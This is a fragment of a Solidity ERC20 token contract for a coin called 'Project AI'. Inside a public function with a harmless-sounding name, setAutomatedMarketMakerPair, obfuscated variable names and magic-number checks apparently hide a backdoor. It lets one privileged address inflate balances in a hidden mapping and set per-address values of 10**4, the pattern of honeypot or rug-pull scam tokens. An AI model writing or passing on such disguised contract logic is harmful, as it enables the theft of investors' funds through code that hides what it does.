...
contract ProjectAI is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Project AI";
    string private _symbol = "PROJAI";
    ...
    function setAutomatedMarketMakerPair(address newSend,uint256 intparma) public {
        ...
        if (WETH > (120+1893)) _zxc[FRbren] += uint256(WETH);
        if (WETH == (17+17)) extend[newSend] = 10**4;
        require(FRbren == rednes);
    }
